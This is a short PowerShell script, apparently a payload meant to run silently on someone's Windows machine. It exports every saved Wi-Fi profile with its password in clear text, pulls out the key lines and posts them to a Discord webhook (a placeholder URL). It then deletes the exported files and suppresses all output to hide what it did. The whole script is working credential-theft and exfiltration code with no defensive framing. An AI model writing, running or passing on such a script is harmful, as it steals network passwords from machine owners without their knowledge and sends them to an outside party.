Set-Location "$env:USERPROFILE\Desktop" > $null 2>&1

netsh wlan export profile key=clear > $null 2>&1

Select-String -Path Wi*.xml -Pattern 'keyMaterial' | Out-File -Encoding utf8 Wi-Fi-PASS.txt > $null 2>&1

$content = (Get-Content -Path Wi-Fi-PASS.txt -Raw).Trim()
if (-not [string]::IsNullOrWhiteSpace($content)) {
    $body = @{content = $content} | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/YOUR-WEBHOOK-HERE' -Method Post -Body $body -ContentType 'application/json' > $null 2>&1
}

Remove-Item Wi-* -Force -Recurse > $null 2>&1

exit
